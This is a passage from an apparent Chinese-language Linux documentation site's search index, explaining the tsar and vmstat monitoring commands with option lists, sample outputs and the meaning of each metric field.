Enabled: --cpu CPU \u6570\u636e (user, system, interrupt, nice, & idle) --mem \u7269\u7406\u5185\u5b58\u3002share (active, inactive, cached, free, wired) --swap swap \u4f7f\u7528 --tcp TCP \u6d41\u91cf (v4) --udp UDP \u6d41\u91cf (v4) --traffic \u51c0\u6d41\u91cf\u7edf\u8ba1 --io Linux I/O performance --pcsw \u6d41\u7a0b\uff08\u4efb\u52a1\uff09\u521b\u5efa\u548c\u4e0a\u4e0b\u6587\u5207\u6362 --partition \u78c1\u76d8\u548c\u5206\u533a\u4f7f\u7528\u60c5\u51b5 --tcpx TCP connection data --load \u7cfb\u7edf\u8fd0\u884c\u961f\u5217\u548c\u5e73\u5747\u8d1f\u8f7d \u5b89\u88c5\u540e\uff0c\u60a8\u53ef\u80fd\u4f1a\u770b\u5230\u4ee5\u4e0b\u6587\u4ef6\uff1a /etc/tsar/tsar.conf \uff0c\u8fd9\u662ftsar\u7684\u4e3b\u914d\u7f6e\u6587\u4ef6; /etc/cron.d/tsar \uff0c\u7528\u4e8e\u8fd0\u884ctsar\u6bcf\u5206\u949f\u6536\u96c6\u4fe1\u606f; /etc/logrotate.d/tsar \u5c06\u6bcf\u6708\u8f6e\u6362tsar\u7684\u65e5\u5fd7\u6587\u4ef6; /usr/local/tsar/modules \u662f\u6240\u6709\u6a21\u5757\u5e93 \uff08*.so\uff09 \u6240\u5728\u7684\u76ee\u5f55;","title":"tsar\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#_1","text":"","title":"\u5e38\u7528\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#_2","text":"#tsar --live -i 1 --traffic Time ---------------------traffic-------------------- Time bytin bytout pktin pktout pkterr pktdrp 12/10/23-17:17:15 174.00 160.00 3.00 2.00 0.00 0.00 12/10/23-17:17:16 672.00 2.8K 8.00 9.00 0.00 0.00 12/10/23-17:17:17 968.00 2.5K 12.00 11.00 0.00 0.00 12/10/23-17:17:18 618.00 1.0K 7.00 7.00 0.00 0.00 12/10/23-17:17:19 66.00 182.00 1.00 1.00 0.00 0.00 12/10/23-17:17:20 150.00 278.00 3.00 3.00 0.00 0.00 12/10/23-17:17:21 1.9K 2.3K 16.00 14.00 0.00 0.00 12/10/23-17:17:22 1.9K 1.8K 13.00 13.00 0.00 0.00 12/10/23-17:17:23 2.1K 3.3K 14.00 13.00 0.00 0.00 12/10/23-17:17:24 984.00 1.4K 10.00 10.00 0.00 0.00 12/10/23-17:17:25 452.00 584.00 6.00 6.00 0.00 0.00 12/10/23-17:17:26 1.0K 1.9K 12.00 12.00 0.00 0.00 12/10/23-17:17:27 884.00 2.2K 10.00 10.00 0.00 0.00","title":"\u67e5\u770b\u7f51\u5361\u662f\u5426\u4e22\u5305"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#5","text":"tsar -n 5 -i i --traffic","title":"\u663e\u793a\u8fc7\u53bb5\u5929\u6bcf\u4e00\u5206\u949f\u7684\u7f51\u7edc\u4fe1\u606f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#cpu","text":"user: \u8868\u793aCPU\u6267\u884c\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4,\u901a\u5e38\u671f\u671b\u7528\u6237\u7a7a\u95f4CPU\u8d8a\u9ad8\u8d8a\u597d. sys: \u8868\u793aCPU\u5728\u5185\u6838\u8fd0\u884c\u65f6\u95f4,\u7cfb\u7edfCPU\u5360\u7528\u7387\u9ad8,\u8868\u660e\u7cfb\u7edf\u67d0\u90e8\u5206\u5b58\u5728\u74f6\u9888.\u901a\u5e38\u503c\u8d8a\u4f4e\u8d8a\u597d. wait: CPU\u5728\u7b49\u5f85I/O\u64cd\u4f5c\u5b8c\u6210\u6240\u82b1\u8d39\u7684\u65f6\u95f4.\u7cfb\u7edf\u4e0d\u5e94\u8be5\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u6765\u7b49\u5f85I/O\u64cd\u4f5c,\u5426\u5219\u5c31\u8bf4\u660eI/O\u5b58\u5728\u74f6\u9888. hirq: \u7cfb\u7edf\u5904\u7406\u786c\u4e2d\u65ad\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u767e\u5206\u6bd4 sirq: \u7cfb\u7edf\u5904\u7406\u8f6f\u4e2d\u65ad\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u767e\u5206\u6bd4 util: CPU\u603b\u4f7f\u7528\u7684\u65f6\u95f4\u767e\u5206\u6bd4 nice: \u7cfb\u7edf\u8c03\u6574\u8fdb\u7a0b\u4f18\u5148\u7ea7\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u767e\u5206\u6bd4 steal: \u88ab\u5f3a\u5236\u7b49\u5f85\uff08involuntary wait\uff09\u865a\u62dfCPU\u7684\u65f6\u95f4,\u6b64\u65f6hypervisor\u5728\u4e3a\u53e6\u4e00\u4e2a\u865a\u62df\u5904\u7406\u5668\u670d\u52a1 ncpu: CPU\u7684\u603b\u4e2a\u6570","title":"cpu \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#mem","text":"free: \u7a7a\u95f2\u7684\u7269\u7406\u5185\u5b58\u7684\u5927\u5c0f used: \u5df2\u7ecf\u4f7f\u7528\u7684\u5185\u5b58\u5927\u5c0f buff: buff\u4f7f\u7528\u7684\u5185\u5b58\u5927\u5c0f,buffer is something that has yet to be \"written\" to disk. cach: \u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u7ecf\u5e38\u8bbf\u95ee\u7684\u4e1c\u897f\u653e\u5728cache\u4e2d\u52a0\u5feb\u6267\u884c\u901f\u5ea6,A cache is something that has been \"read\" from the disk and stored for later use total: \u7cfb\u7edf\u603b\u7684\u5185\u5b58\u5927\u5c0f util: \u5185\u5b58\u4f7f\u7528\u7387","title":"mem \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#load","text":"load1: \u4e00\u5206\u949f\u7684\u7cfb\u7edf\u5e73\u5747\u8d1f\u8f7d load5: \u4e94\u5206\u949f\u7684\u7cfb\u7edf\u5e73\u5747\u8d1f\u8f7d load15:\u5341\u4e94\u5206\u949f\u7684\u7cfb\u7edf\u5e73\u5747\u8d1f\u8f7d runq: \u5728\u91c7\u6837\u65f6\u523b,\u8fd0\u884c\u961f\u5217\u7684\u4efb\u52a1\u7684\u6570\u76ee,\u4e0e/proc/stat\u7684procs_running\u8868\u793a\u76f8\u540c\u610f\u601d plit: \u5728\u91c7\u6837\u65f6\u523b,\u7cfb\u7edf\u4e2d\u6d3b\u8dc3\u7684\u4efb\u52a1\u7684\u4e2a\u6570\uff08\u4e0d\u5305\u62ec\u8fd0\u884c\u5df2\u7ecf\u7ed3\u675f\u7684\u4efb\u52a1\uff09","title":"load \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#traffic","text":"bytin: \u5165\u53e3\u6d41\u91cfbyte/s bytout: \u51fa\u53e3\u6d41\u91cfbyte/s pktin: \u5165\u53e3pkt/s pktout: \u51fa\u53e3pkt/s","title":"traffic \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#tcp","text":"active:\u4e3b\u52a8\u6253\u5f00\u7684tcp\u8fde\u63a5\u6570\u76ee pasive:\u88ab\u52a8\u6253\u5f00\u7684tcp\u8fde\u63a5\u6570\u76ee iseg: \u6536\u5230\u7684tcp\u62a5\u6587\u6570\u76ee outseg:\u53d1\u51fa\u7684tcp\u62a5\u6587\u6570\u76ee EstRes:Number of resets that have occurred at ESTABLISHED AtmpFa:Number of failed connection attempts CurrEs:\u5f53\u524d\u72b6\u6001\u4e3aESTABLISHED\u7684tcp\u8fde\u63a5\u6570 retran:\u7cfb\u7edf\u7684\u91cd\u4f20\u7387","title":"tcp \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#udp","text":"idgm: \u6536\u5230\u7684udp\u62a5\u6587\u6570\u76ee odgm: \u53d1\u9001\u7684udp\u62a5\u6587\u6570\u76ee noport:udp\u534f\u8bae\u5c42\u63a5\u6536\u5230\u76ee\u7684\u5730\u5740\u6216\u76ee\u7684\u7aef\u53e3\u4e0d\u5b58\u5728\u7684\u6570\u636e\u5305 idmerr:udp\u5c42\u63a5\u6536\u5230\u7684\u65e0\u6548\u6570\u636e\u5305\u7684\u4e2a\u6570","title":"udp \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#tcpx","text":"recvq : tcprecvq sendq : tcpsendq est : tcpest twait: tcptimewait fwait1 : tcpfinwait1 fwait2 : tcpfinwait2 lisq : tcplistenq lising : tcplistenincq lisove : tcplistenover cnest : tcpnconnest ndrop : tcpnconndrop edrop : tcpembdrop rdrop : tcprexmitdrop pdrop : tcppersistdrop kdrop : tcpkadrop","title":"tcpx \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#paritition","text":"bfree: \u5206\u533a\u7a7a\u95f2\u7684\u5b57\u8282 bused: \u5206\u533a\u4f7f\u7528\u4e2d\u7684\u5b57\u8282 btotl: \u5206\u533a\u603b\u7684\u5927\u5c0f util: \u5206\u533a\u4f7f\u7528\u7387","title":"paritition \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#pcsw","text":"cswch: \u8fdb\u7a0b\u5207\u6362\u6b21\u6570 proc: \u65b0\u5efa\u7684\u8fdb\u7a0b\u6570","title":"pcsw \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#proc","text":"user: \u67d0\u4e2a\u8fdb\u7a0b\u7528\u6237\u6001cpu\u6d88\u8017 sys: \u67d0\u4e2a\u8fdb\u7a0b\u7cfb\u7edf\u6001cpu\u6d88\u8017 total:\u67d0\u4e2a\u8fdb\u7a0b\u603b\u7684cpu\u6d88\u8017 mem: \u67d0\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u6d88\u8017\u767e\u5206\u6bd4 RSS: \u67d0\u4e2a\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u6d88\u8017,\u8fd9\u662f\u9a7b\u7559\u5728\u7269\u7406\u5185\u5b58\u7684\u4e00\u90e8\u5206.\u5b83\u6ca1\u6709\u4ea4\u6362\u5230\u786c\u76d8.\u5b83\u5305\u62ec\u4ee3\u7801,\u6570\u636e\u548c\u6808 read: \u8fdb\u7a0bio\u8bfb\u5b57\u8282 write:\u8fdb\u7a0b\u7684io\u5199\u5b57\u8282","title":"proc \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#nginx","text":"Accept:\u603b\u5171\u63a5\u6536\u7684\u65b0\u8fde\u63a5\u6570\u76ee Handle:\u603b\u5171\u5904\u7406\u7684\u8fde\u63a5\u6570\u76ee Reqs:\u603b\u5171\u4ea7\u751f\u8bf7\u6c42\u6570\u76ee Active:\u6d3b\u8dc3\u7684\u8fde\u63a5\u6570,\u7b49\u4e8eread+write+wait Read:\u8bfb\u53d6\u8bf7\u6c42\u6570\u636e\u7684\u8fde\u63a5\u6570\u76ee Write:\u5411\u7528\u6237\u5199\u54cd\u5e94\u6570\u636e\u7684\u8fde\u63a5\u6570\u76ee Wait:\u957f\u8fde\u63a5\u7b49\u5f85\u7684\u8fde\u63a5\u6570\u76ee Qps:\u6bcf\u79d2\u5904\u7406\u7684\u8bf7\u6c42\u6570 Rt:\u5e73\u5747\u54cd\u5e94\u65f6\u95f4ms","title":"nginx \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#squid","text":"qps: \u6bcf\u79d2\u8bf7\u6c42\u6570 rt: \u8bbf\u95ee\u5e73\u5747\u76f8\u5e94\u65f6\u95f4 r_hit: \u8bf7\u6c42\u547d\u4e2d\u7387 b_hit: \u5b57\u8282\u547d\u4e2d\u7387 d_hit: \u78c1\u76d8\u547d\u4e2d\u7387 m_hit: \u5185\u5b58\u547d\u4e2d\u7387 fdused: Number of file desc currently in use fdque: Files queued for open objs: StoreEntries inmem: StoreEntries with MemObjects hot: Hot Object Cache Items size: Mean Object Size haproxy \u5b57\u6bb5\u542b\u4e49 stat: \u72b6\u6001,1\u6b63\u5e38 uptime:\u542f\u52a8\u6301\u7eed\u65f6\u95f4 conns: \u603b\u7684\u8fde\u63a5\u6570 qps: \u6bcf\u79d2\u8bf7\u6c42\u6570 hit: haproxy\u5f00\u542fcache\u65f6\u7684\u547d\u4e2d\u7387 rt: \u5e73\u5747\u54cd\u5e94\u65f6\u95f4ms","title":"squid \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#lvs","text":"stat: lvs\u72b6\u6001,1\u6b63\u5e38 conns: \u603b\u7684\u8fde\u63a5\u6570 pktin: \u6536\u5230\u7684\u5305\u6570 pktout:\u53d1\u51fa\u7684\u5305\u6570 bytin: \u6536\u5230\u7684\u5b57\u8282\u6570 bytout:\u53d1\u51fa\u7684\u5b57\u8282\u6570","title":"lvs \u5b57\u6bb5\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#_3","text":"\u80fd\u4e0d\u80fd\u5bf9mysql\u8868\u5185\u7684\u4e00\u4e9b\u5b57\u6bb5\u8fdb\u884c\u4e00\u4e0b\u6ce8\u91ca\u8bf4\u660e \u00b7 Issue #19 \u00b7 alibaba/tsar \u00b7 GitHub tsar\u4f7f\u7528\u8bf4\u660e - sidesky - \u535a\u5ba2\u56ed (cnblogs.com) GitHub - alibaba/tsar: Taobao System Activity Reporter \u5173\u4e8etraffic\u4e2d\u7684\u5355\u4f4d\u95ee\u9898\u3002 \u00b7 Issue #106 \u00b7 alibaba/tsar \u00b7 GitHub tsar\u547d\u4ee4 \u2013 \u6536\u96c6\u670d\u52a1\u5668\u7cfb\u7edf\u4fe1\u606f \u2013 Linux\u547d\u4ee4\u5927\u5168(\u624b\u518c) (linuxcool.com)","title":"\u76f8\u5173\u94fe\u63a5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/","text":"vmstat vmstat\u547d\u4ee4\u7684\u542b\u4e49\u4e3a\u663e\u793a\u865a\u62df\u5185\u5b58\u72b6\u6001\uff08\u201cViryual Memor Statics\u201d\uff09\uff0c\u4f46\u662f\u5b83\u53ef\u4ee5\u62a5\u544a\u5173\u4e8e\u8fdb\u7a0b\u3001\u5185\u5b58\u3001I/O\u7b49\u7cfb\u7edf\u6574\u4f53\u8fd0\u884c\u72b6\u6001\u3002 vmstat\u9009\u9879\u53c2\u6570 -a\uff1a\u663e\u793a\u6d3b\u52a8\u5185\u9875\uff1b -f\uff1a\u663e\u793a\u542f\u52a8\u540e\u521b\u5efa\u7684\u8fdb\u7a0b\u603b\u6570\uff1b -m\uff1a\u663e\u793aslab\u4fe1\u606f\uff1b -n\uff1a\u5934\u4fe1\u606f\u4ec5\u663e\u793a\u4e00\u6b21\uff1b -s\uff1a\u4ee5\u8868\u683c\u65b9\u5f0f\u663e\u793a\u4e8b\u4ef6\u8ba1\u6570\u5668\u548c\u5185\u5b58\u72b6\u6001\uff1b -d\uff1a\u62a5\u544a\u78c1\u76d8\u72b6\u6001\uff1b -p\uff1a\u663e\u793a\u6307\u5b9a\u7684\u786c\u76d8\u5206\u533a\u72b6\u6001\uff1b -S\uff1a\u8f93\u51fa\u4fe1\u606f\u7684\u5355\u4f4d\u3002 -w, --wide \u8be6\u7ec6\u5185\u5bb9 -t, --timestamp \u663e\u793a\u65f6\u95f4\u6233 -h, --help \u663e\u793a\u5e2e\u52a9 -V, --version \u663e\u793a\u7248\u672c [root@VM-0-16-centos ~]# vmstat -wt 1 3 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 1 0 0 6388276 257024 1030324 0 0 0 1 0 2 0 0 100 0 0 2022-05-20 02:03:35 0 0 0 6388136 257024 1030324 0 0 0 16 1576 3013 0 0 100 0 0 2022-05-20 02:03:36 0 0 0 6388136 257024 1030324 0 0 0 0 1523 2974 0 0 100 0 0 2022-05-20 02:03:37 \"vmstat\u547d\u4ee4\u8be6\u60c5\" \"r:\u8fd0\u884c\u961f\u5217\u4e2d\u7ebf\u7a0b\u6570\u91cf,r+b\u7684\u503c\uff0c\u5e94\u8be5\u5c0f\u4e8ecpu\u4e2a\u6570\u7684\u4e24\u500d\" \"b:IO\u53d1\u751f\u963b\u585e\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u5f53b\u6570\u91cf\u5927\u4e8e5\u65f6\uff0c\u5e94\u8be5\u6392\u67e5\u78c1\u76d8\u6216\u8005swap\" \"swpd:\u4f7f\u7528\u865a\u62df\u5185\u5b58\u5927\u5c0f\" \"free:\u53ef\u7528\u5185\u5b58\u5927\u5c0f\" \"buff:\u7528\u4e8e\u7f13\u51b2\u7684\u5185\u5b58\u5927\u5c0f\" \"cache:\u7528\u4e8e\u7f13\u5b58\u7684\u5185\u5b58\u5927\u5c0f\" \"cache\u662f\u88ab\u4ece\u78c1\u76d8\u4e2d\u8bfb\u51fa\u6765\u7684\uff0c\u800cbuff\u662f\u5373\u5c06\u8981\u88ab\u5199\u5165\u78c1\u76d8\u7684\" \"si:\u6bcf\u79d2\u4ece\u4ea4\u6362\u533a\u5199\u5230\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5982\u679c\u8fd9\u4e2a\u503c\u5927\u4e8e0\uff0c\u8bf4\u660e\u5185\u5b58\u4e0d\u8db3\" \"so:\u6bcf\u79d2\u4ece\u5185\u5b58\u5199\u5230\u4ea4\u6362\u533a\u7684\u5927\u5c0f\" \"bi:\u6bcf\u79d2\u8bfb\u53d6\u7684\u5757\u6570\" \"bo:\u6bcf\u79d2\u5199\u5165\u7684\u5757\u6570\" \"in:\u6bcf\u79d2\u7684\u4e2d\u65ad\u6570\uff0c\u5305\u62ec\u65f6\u949f\u3002\" \"cs:\u6bcf\u79d2\u4e0a\u4e0b\u6587\u5207\u6362\u6570,\u5982\u679ccs\u6570\u5b57\u8fdc\u5927\u4e8ein\u7684\u6570\u5b57\uff0c\u8bf4\u660e\u7cfb\u7edf\u5728\u5fd9\u4e8e\u5206\u914d\u4efb\u52a1\uff0c\u6ca1\u6709\u5fd9\u4e8e\u5728\u4efb\u52a1\u4e0a\" \"us:\u7528\u6237\u8fdb\u7a0b\u6267\u884c\u65f6\u95f4\" \"sy:\u7cfb\u7edf\u8fdb\u7a0b\u6267\u884c\u65f6\u95f4\" \"id:\u7a7a\u95f2\u65f6\u95f4\uff08\u5305\u62ecIO\u7b49\u5f85\u65f6\u95f4\uff09\" \"wa:\u7b49\u5f85IO\u65f6\u95f4\" \"st:\u4ece\u865a\u62df\u673a\u7a83\u53d6\u7684\u65f6\u95f4\u3002 \u5728Linux 2.6.11\u4e4b\u524d\uff0c\u672a\u77e5\" vmstat -a 2 5 -a \u663e\u793a\u6d3b\u8dc3\u548c\u975e\u6d3b\u8dc3\u5185\u5b58,\u6240\u663e\u793a\u7684\u5185\u5bb9\u9664\u589e\u52a0inact\u548cactive [root@VM-0-16-centos ~]# vmstat -a 2 5 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free inact active si so bi bo in cs us sy id wa st 3 0 0 6387664 473120 890368 0 0 0 1 0 0 0 0 100 0 0 0 0 0 6387516 473120 890612 0 0 0 0 1545 2986 0 0 100 0 0 0 0 0 6387392 473120 890612 0 0 0 0 1556 3026 0 0 100 0 0 0 0 0 6387268 473120 890612 0 0 0 6 1530 2984 0 0 100 0 0 1 0 0 6387268 473120 890612 0 0 0 0 1545 3010 0 0 100 0 0 vmstat -f \u663e\u793a\u4ece\u7cfb\u7edf\u542f\u52a8\u81f3\u4eca\u7684fork\u6570\u91cf\uff0clinux\u4e0b\u521b\u5efa\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\u662ffork \u8bf4\u660e\uff1a\u4fe1\u606f\u662f\u4ece/proc/stat\u4e2d\u7684processes\u5b57\u6bb5\u91cc\u53d6\u5f97\u7684 $ vmstat -f 351164 forks vmstat -s \u663e\u793a\u5185\u5b58\u76f8\u5173\u7edf\u8ba1\u4fe1\u606f\u53ca\u591a\u79cd\u7cfb\u7edf\u6d3b\u52a8\u6570\u91cf \u8bf4\u660e\uff1a\u8fd9\u4e9b\u4fe1\u606f\u7684\u5206\u522b\u6765\u81ea\u4e8e/proc/meminfo\uff0c/proc/stat\u548c/proc/vmstat [root@VM-0-16-centos ~]# vmstat -s 8008632 K total memory 332136 K used memory 889664 K active memory 473120 K inactive memory 6389112 K free memory 257024 K buffer memory 1030360 K swap cache 0 K total swap 0 K used swap 0 K free swap 1556482 non-nice user cpu ticks 669 nice user cpu ticks 2101154 system cpu ticks 2039287171 idle cpu ticks 108247 IO-wait cpu ticks 0 IRQ cpu ticks 846 softirq cpu ticks 0 stolen cpu ticks 4931445 pages paged in 21441536 pages paged out 0 pages swapped in 0 pages swapped out 3703040179 interrupts 2621374916 CPU context switches 1647854161 boot time 351175 forks [root@VM-0-16-centos ~]# vmstat -d \u67e5\u770b\u78c1\u76d8\u7684\u8bfb\u5199 \u8bf4\u660e\uff1a\u8fd9\u4e9b\u4fe1\u606f\u4e3b\u8981\u6765\u81ea\u4e8e/proc/diskstats [root@VM-0-16-centos ~]# vmstat -d disk- ------------reads------------ ------------writes----------- -----IO------ total merged sectors ms total merged sectors ms cur sec vda 92280 820 9843254 345762 3037845 1006144 42883201 5918518 0 1830 vdb 387 0 18920 188 0 0 0 0 0 0 sr0 99 0 716 18 0 0 0 0 0 0 [root@VM-0-16-centos ~]# vmstat -p /dev/vda1 \u663e\u793a\u6307\u5b9a\u78c1\u76d8\u5206\u533a\u7edf\u8ba1\u4fe1\u606f \u8bf4\u660e\uff1a\u8fd9\u4e9b\u4fe1\u606f\u4e3b\u8981\u6765\u81ea\u4e8e/proc/diskstats. reads:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u8bfb\u7684\u6b21\u6570\u3002 read sectors:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u8bfb\u6247\u533a\u7684\u6b21\u6570\u3002 writes:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u5199\u7684\u6b21\u6570\u3002 requested writes:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u5199\u8bf7\u6c42\u6b21\u6570\u3002 [root@VM-0-16-centos ~]# vmstat -p /dev/vda1 vda1 reads read sectors writes requested writes 92247 9840886 3019912 42883513 vmstat -m \u67e5\u770b\u7cfb\u7edf\u7684slab\u4fe1\u606f [root@VM-0-16-centos ~]# vmstat -m Cache Num Total Size Pages fuse_request 0 0 416 19 fuse_inode 0 0 768 21 isofs_inode_cache 50 50 640 25 mlx_compat_radix_tree_node 28 28 584 28 ext4_groupinfo_4k 420 420 136 30 ext4_inode_cache 32421 32432 1024 16 ext4_xattr 138 138 88 46 ext4_free_data 1024 1024 64 64 ext4_allocation_context 128 128 128 32 ...","title":"vmstat\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat","text":"vmstat\u547d\u4ee4\u7684\u542b\u4e49\u4e3a\u663e\u793a\u865a\u62df\u5185\u5b58\u72b6\u6001\uff08\u201cViryual Memor Statics\u201d\uff09\uff0c\u4f46\u662f\u5b83\u53ef\u4ee5\u62a5\u544a\u5173\u4e8e\u8fdb\u7a0b\u3001\u5185\u5b58\u3001I/O\u7b49\u7cfb\u7edf\u6574\u4f53\u8fd0\u884c\u72b6\u6001\u3002","title":"vmstat"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat_1","text":"-a\uff1a\u663e\u793a\u6d3b\u52a8\u5185\u9875\uff1b -f\uff1a\u663e\u793a\u542f\u52a8\u540e\u521b\u5efa\u7684\u8fdb\u7a0b\u603b\u6570\uff1b -m\uff1a\u663e\u793aslab\u4fe1\u606f\uff1b -n\uff1a\u5934\u4fe1\u606f\u4ec5\u663e\u793a\u4e00\u6b21\uff1b -s\uff1a\u4ee5\u8868\u683c\u65b9\u5f0f\u663e\u793a\u4e8b\u4ef6\u8ba1\u6570\u5668\u548c\u5185\u5b58\u72b6\u6001\uff1b -d\uff1a\u62a5\u544a\u78c1\u76d8\u72b6\u6001\uff1b -p\uff1a\u663e\u793a\u6307\u5b9a\u7684\u786c\u76d8\u5206\u533a\u72b6\u6001\uff1b -S\uff1a\u8f93\u51fa\u4fe1\u606f\u7684\u5355\u4f4d\u3002 -w, --wide \u8be6\u7ec6\u5185\u5bb9 -t, --timestamp \u663e\u793a\u65f6\u95f4\u6233 -h, --help \u663e\u793a\u5e2e\u52a9 -V, --version \u663e\u793a\u7248\u672c [root@VM-0-16-centos ~]# vmstat -wt 1 3 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 1 0 0 6388276 257024 1030324 0 0 0 1 0 2 0 0 100 0 0 2022-05-20 02:03:35 0 0 0 6388136 257024 1030324 0 0 0 16 1576 3013 0 0 100 0 0 2022-05-20 02:03:36 0 0 0 6388136 257024 1030324 0 0 0 0 1523 2974 0 0 100 0 0 2022-05-20 02:03:37 \"vmstat\u547d\u4ee4\u8be6\u60c5\" \"r:\u8fd0\u884c\u961f\u5217\u4e2d\u7ebf\u7a0b\u6570\u91cf,r+b\u7684\u503c\uff0c\u5e94\u8be5\u5c0f\u4e8ecpu\u4e2a\u6570\u7684\u4e24\u500d\" \"b:IO\u53d1\u751f\u963b\u585e\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u5f53b\u6570\u91cf\u5927\u4e8e5\u65f6\uff0c\u5e94\u8be5\u6392\u67e5\u78c1\u76d8\u6216\u8005swap\" \"swpd:\u4f7f\u7528\u865a\u62df\u5185\u5b58\u5927\u5c0f\" \"free:\u53ef\u7528\u5185\u5b58\u5927\u5c0f\" \"buff:\u7528\u4e8e\u7f13\u51b2\u7684\u5185\u5b58\u5927\u5c0f\" \"cache:\u7528\u4e8e\u7f13\u5b58\u7684\u5185\u5b58\u5927\u5c0f\" \"cache\u662f\u88ab\u4ece\u78c1\u76d8\u4e2d\u8bfb\u51fa\u6765\u7684\uff0c\u800cbuff\u662f\u5373\u5c06\u8981\u88ab\u5199\u5165\u78c1\u76d8\u7684\" \"si:\u6bcf\u79d2\u4ece\u4ea4\u6362\u533a\u5199\u5230\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5982\u679c\u8fd9\u4e2a\u503c\u5927\u4e8e0\uff0c\u8bf4\u660e\u5185\u5b58\u4e0d\u8db3\" \"so:\u6bcf\u79d2\u4ece\u5185\u5b58\u5199\u5230\u4ea4\u6362\u533a\u7684\u5927\u5c0f\" \"bi:\u6bcf\u79d2\u8bfb\u53d6\u7684\u5757\u6570\" \"bo:\u6bcf\u79d2\u5199\u5165\u7684\u5757\u6570\" \"in:\u6bcf\u79d2\u7684\u4e2d\u65ad\u6570\uff0c\u5305\u62ec\u65f6\u949f\u3002\" \"cs:\u6bcf\u79d2\u4e0a\u4e0b\u6587\u5207\u6362\u6570,\u5982\u679ccs\u6570\u5b57\u8fdc\u5927\u4e8ein\u7684\u6570\u5b57\uff0c\u8bf4\u660e\u7cfb\u7edf\u5728\u5fd9\u4e8e\u5206\u914d\u4efb\u52a1\uff0c\u6ca1\u6709\u5fd9\u4e8e\u5728\u4efb\u52a1\u4e0a\" \"us:\u7528\u6237\u8fdb\u7a0b\u6267\u884c\u65f6\u95f4\" \"sy:\u7cfb\u7edf\u8fdb\u7a0b\u6267\u884c\u65f6\u95f4\" \"id:\u7a7a\u95f2\u65f6\u95f4\uff08\u5305\u62ecIO\u7b49\u5f85\u65f6\u95f4\uff09\" \"wa:\u7b49\u5f85IO\u65f6\u95f4\" \"st:\u4ece\u865a\u62df\u673a\u7a83\u53d6\u7684\u65f6\u95f4\u3002 \u5728Linux 2.6.11\u4e4b\u524d\uff0c\u672a\u77e5\"","title":"vmstat\u9009\u9879\u53c2\u6570"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat-a-2-5","text":"-a \u663e\u793a\u6d3b\u8dc3\u548c\u975e\u6d3b\u8dc3\u5185\u5b58,\u6240\u663e\u793a\u7684\u5185\u5bb9\u9664\u589e\u52a0inact\u548cactive [root@VM-0-16-centos ~]# vmstat -a 2 5 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free inact active si so bi bo in cs us sy id wa st 3 0 0 6387664 473120 890368 0 0 0 1 0 0 0 0 100 0 0 0 0 0 6387516 473120 890612 0 0 0 0 1545 2986 0 0 100 0 0 0 0 0 6387392 473120 890612 0 0 0 0 1556 3026 0 0 100 0 0 0 0 0 6387268 473120 890612 0 0 0 6 1530 2984 0 0 100 0 0 1 0 0 6387268 473120 890612 0 0 0 0 1545 3010 0 0 100 0 0","title":"vmstat -a 2 5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat-f","text":"\u663e\u793a\u4ece\u7cfb\u7edf\u542f\u52a8\u81f3\u4eca\u7684fork\u6570\u91cf\uff0clinux\u4e0b\u521b\u5efa\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\u662ffork 